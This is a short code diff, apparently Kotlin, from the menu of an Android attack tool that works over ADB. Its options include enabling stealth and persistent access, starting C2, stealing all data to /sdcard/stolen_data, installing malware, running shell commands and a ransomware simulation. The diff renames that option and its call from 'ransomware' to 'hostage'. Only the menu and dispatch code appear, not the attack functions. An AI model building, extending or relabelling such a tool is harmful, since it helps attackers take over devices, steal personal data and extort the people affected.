@@ -18,7 +18,7 @@ fun main() {
     println("1. Prepare Attack (Enable stealth, persistent access, start C2)")
     println("2. Steal All Data (to /sdcard/stolen_data)")
     println("3. Dump System Info (to /sdcard/system_info)")
-    println("4. Simulate Ransomware")
+    println("4. Simulate Hostage")
     println("5. Install Malware")
     println("6. Execute Shell Command")
     println("7. List Files")
@@ -59,9 +59,9 @@ fun main() {
                 println("System information dumping initiated (check device for files).")
             }
             "4" -> {
-                println("Simulating ransomware...")
-                adb.simulateRansomware()
-                println("Ransomware simulation initiated.")
+                println("Simulating hostage...")
+                adb.hostage()
+                println("Hostage simulation initiated.")
             }
             "5" -> {
                 print("Enter path to APK: ")
